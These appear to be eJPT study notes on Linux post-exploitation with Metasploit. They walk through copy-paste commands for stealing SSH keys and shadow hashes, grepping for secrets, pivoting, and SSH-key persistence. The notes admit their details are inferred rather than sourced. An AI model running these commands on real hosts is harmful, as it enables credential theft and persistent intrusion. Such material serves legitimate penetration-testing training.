# 01 – Linux Post Exploitation Modules (eJPT Notes)

Note: No transcript was provided. The following is inferred conservatively from the filename and common eJPT workflows for Linux post-exploitation using Metasploit and Meterpreter. Exact module names/flags can vary slightly by Metasploit version; verify with `search` and `info`.

## What the video covers (Introduction / big picture)
- How to use Metasploit post-exploitation modules on a compromised Linux host
- Quick-win enumeration: system info, users, services, network, protections
- Harvesting credentials: SSH keys, history files, `/etc/shadow` (if root), known hosts
- Local exploit suggestion for privilege escalation
- Persistence basics and pivoting through a Linux foothold
- Managing loot and exporting data for cracking (e.g., John)

## Flow (ordered)
1. Confirm you have a Linux session (preferably Meterpreter). If not, upgrade shell to Meterpreter.
2. Run core Linux gather modules (system, network, protections, services).
3. Hunt credentials and sensitive files (SSH, shadow, history).
4. Suggest local privilege escalations with `local_exploit_suggester`.
5. If needed, establish persistence (e.g., SSH key) and/or pivoting (routes, socks).
6. Export/loot outputs and crack offline where applicable.
7. Clean up and document.

## Tools highlighted
- Metasploit Framework (msfconsole)
- Meterpreter (Linux)
- Metasploit post modules: post/linux/gather/*, post/multi/recon/local_exploit_suggester, post/multi/manage/autoroute
- Linux built-ins (via meterpreter shell): id, uname, sudo -l, find (SUID), getcap, ss/netstat, ip/ifconfig
- John the Ripper (for cracking, if hashes are obtained)

## Typical command walkthrough (detailed, copy-paste friendly)

Prereqs:
- You already have a Linux session (Meterpreter preferred). Replace SESSION_ID with your session number.
- Run inside msfconsole.

1) Identify and select your session
```
sessions -l
```
If you only have a plain shell session, try upgrading:
```
use post/multi/manage/shell_to_meterpreter
set SESSION SESSION_ID
run
sessions -l
```

2) Quick sanity checks (optional Meterpreter commands)
```
sessions -i SESSION_ID
getuid
sysinfo
ifconfig
route
ps
shell
id; uname -a; whoami; exit
background
```

3) Core Linux post-exploitation enumeration
```
search type:post platform:linux gather
```
Run common gather modules (set your SESSION each time):
```
use post/linux/gather/enum_system
set SESSION SESSION_ID
run

use post/linux/gather/enum_network
set SESSION SESSION_ID
run

use post/linux/gather/enum_protections
set SESSION SESSION_ID
run

use post/linux/gather/enum_services
set SESSION SESSION_ID
run

use post/linux/gather/checkvm
set SESSION SESSION_ID
run

use post/linux/gather/enum_configs
set SESSION SESSION_ID
run
```

4) Credentials harvesting
- SSH-related (paths vary; use search to confirm availability)
```
search type:post platform:linux ssh gather
```
Common modules:
```
use post/multi/gather/ssh_creds
set SESSION SESSION_ID
run

use post/multi/gather/ssh_configs
set SESSION SESSION_ID
run

use post/multi/gather/ssh_known_hosts
set SESSION SESSION_ID
run
```
- Hashdump (requires sufficient privileges; often root):
```
use post/linux/gather/hashdump
set SESSION SESSION_ID
run
```
If you have root shell, you can manually pull passwd/shadow for cracking:
```
sessions -i SESSION_ID
shell
cp /etc/passwd /tmp/passwd.copy 2>/dev/null
cp /etc/shadow /tmp/shadow.copy 2>/dev/null
exit
download /tmp/passwd.copy
download /tmp/shadow.copy
```
Unshadow and crack locally:
```
unshadow passwd.copy shadow.copy > unshadowed.txt
john --wordlist=/usr/share/wordlists/rockyou.txt unshadowed.txt
```

Also check common plaintext/semi-secret locations (from a shell):
```
sessions -i SESSION_ID
shell
for u in /home/*; do ls -la $u/.ssh 2>/dev/null; done
grep -R "password\|passwd\|secret\|token\|api" -ni /home/* 2>/dev/null | head
for u in /home/*; do tail -n 100 $u/.bash_history 2>/dev/null; done
exit
```

5) Local exploit suggestion (privilege escalation hints)
```
use post/multi/recon/local_exploit_suggester
set SESSION SESSION_ID
run
```
Review suggestions, then test appropriate `exploit/linux/local/*` modules as indicated by the suggester results and target context.

6) Pivoting (routes and SOCKS)
- Add routes via the session:
```
route
route add 10.10.10.0 255.255.255.0 SESSION_ID
route print
```
Alternatively, use autoroute:
```
use post/multi/manage/autoroute
set SESSION SESSION_ID
set SUBNET 10.10.10.0
set NETMASK 255.255.255.0
run
```
- Start a SOCKS proxy inside Metasploit for tooling through the pivot:
```
use auxiliary/server/socks_proxy
set VERSION 5
set SRVHOST 127.0.0.1
set SRVPORT 1080
run -j
```
- Example local port forward from Meterpreter:
```
sessions -i SESSION_ID
portfwd add -l 8443 -p 443 -r 10.10.10.20
background
```

7) Persistence (basic SSH key persistence where appropriate/authorized)
- If your user has write access to a home directory, add your public key to authorized_keys:
```
sessions -i SESSION_ID
shell
mkdir -p ~/.ssh
echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQ..." >> ~/.ssh/authorized_keys
chmod 700 ~/.ssh
chmod 600 ~/.ssh/authorized_keys
exit
```
- If a Metasploit module exists in your version (verify with `search`), consider:
```
search type:post platform:linux manage persistence
```
Careful: Only perform persistence with permission.

8) Loot and creds management in Metasploit
```
loot
creds
```
Loot files are typically stored under ~/.msf4/loot (path shown by `loot` output).

9) Optional: Spool output for good notes
```
spool /tmp/msf_linux_postexp.log
...run modules...
spool off
```

## Practical tips
- Prefer Meterpreter: Most post modules require a Meterpreter session. Upgrade shells with `post/multi/manage/shell_to_meterpreter`.
- Always set SESSION: Almost all post modules need `set SESSION <id>`.
- Verify module availability: Names can change across versions. Use `search` and `info` to confirm exact module names and options.
- Least noise first: Run read-only gather modules before attempting privesc or persistence.
- Check protections: `enum_protections` helps you pick appropriate local exploits (kernel, ASLR, SELinux/AppArmor).
- Don’t forget user land: `.ssh`, `.bash_history`, config files, backups, and web app directories often yield credentials.
- Root or GTFO for shadow: `hashdump`/shadow access usually needs root. If you can’t read shadow, pivot to other creds sources.
- Pivot early: If you see additional subnets/interfaces, set routes and a SOCKS proxy early to keep momentum.
- Document and clean up: Track every change (persistence, routes, files). Remove test users/keys/services when done.

## Minimal cheat sheet (one-screen flow)
```
# Pick/upgrade session
sessions -l
use post/multi/manage/shell_to_meterpreter; set SESSION 1; run

# Core gather
use post/linux/gather/enum_system; set SESSION 1; run
use post/linux/gather/enum_network; set SESSION 1; run
use post/linux/gather/enum_protections; set SESSION 1; run
use post/linux/gather/enum_services; set SESSION 1; run
use post/linux/gather/checkvm; set SESSION 1; run

# Creds
use post/multi/gather/ssh_creds; set SESSION 1; run
use post/multi/gather/ssh_configs; set SESSION 1; run
use post/multi/gather/ssh_known_hosts; set SESSION 1; run
use post/linux/gather/hashdump; set SESSION 1; run  # (needs privs)

# Local privesc suggestions
use post/multi/recon/local_exploit_suggester; set SESSION 1; run

# Pivot
route add 10.10.10.0 255.255.255.0 1
use auxiliary/server/socks_proxy; set VERSION 5; set SRVHOST 127.0.0.1; set SRVPORT 1080; run -j

# Loot view
loot
creds
```

## Summary
This module introduces practical Linux post-exploitation with Metasploit. After securing a Meterpreter session, run Linux gather modules to quickly enumerate system, network, protections, and services. Harvest credentials from SSH-related files and, when privileged, dump hashes for offline cracking. Use the local exploit suggester to guide privilege escalation attempts. For lateral movement, add routes and bring up a SOCKS proxy or port forwards. Where permitted, establish minimal persistence (e.g., SSH key). Manage your loot/creds in msfconsole and maintain good OPSEC by documenting actions and cleaning up.